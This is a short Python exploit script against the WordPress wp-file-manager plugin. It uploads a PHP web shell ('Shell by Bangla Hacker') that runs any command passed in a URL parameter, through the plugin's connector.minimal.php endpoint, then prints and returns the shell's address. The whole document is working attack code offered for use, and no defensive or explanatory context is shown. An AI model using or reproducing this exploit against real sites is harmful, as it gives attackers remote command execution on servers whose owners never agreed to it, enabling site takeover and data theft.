import requests

def try_shell_upload(target):
    shell_url = f"{target}/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
    files = {
        "upload[]": ("shell.php", "<?php echo 'Shell by Bangla Hacker'; system($_GET['cmd']); ?>", "application/x-php")
    }

    try:
        res = requests.post(shell_url, files=files, timeout=10)
        if res.status_code == 200:
            print(f"[âœ“] Shell uploaded to: {target}/wp-content/plugins/wp-file-manager/lib/files/shell.php")
            return f"{target}/wp-content/plugins/wp-file-manager/lib/files/shell.php"
        else:
            print("[-] Upload failed or patched.")
    except Exception as e:
        print(f"[!] Exploit error: {e}")

    return None
